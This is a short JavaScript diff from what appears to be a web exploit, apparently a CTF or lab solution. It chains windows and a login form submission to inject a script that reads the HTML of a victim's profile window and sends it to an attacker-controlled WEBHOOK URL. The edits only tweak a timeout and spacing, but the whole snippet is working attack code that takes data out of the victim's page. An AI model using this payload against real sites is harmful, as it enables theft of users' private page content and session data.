@@ -23,11 +23,11 @@ try {
   if (id === "1") {
     window.open(PROFILE, "first");
     const me = window.open(ORIGIN + "?id=2", "first");
-    setTimeout(() => (me.location = PROFILE), 5000);
+    setTimeout(() => (me.location = PROFILE), 3000);
   } else if (id === "2") {
     const payload = `<script>
 const content = window.open('', 'first').document.body.innerHTML;
-window.location="${WEBHOOK}?" + content;
+window.location = "${WEBHOOK}?" + content;
 </script>`;
     document.getElementById("login").submit();
   }
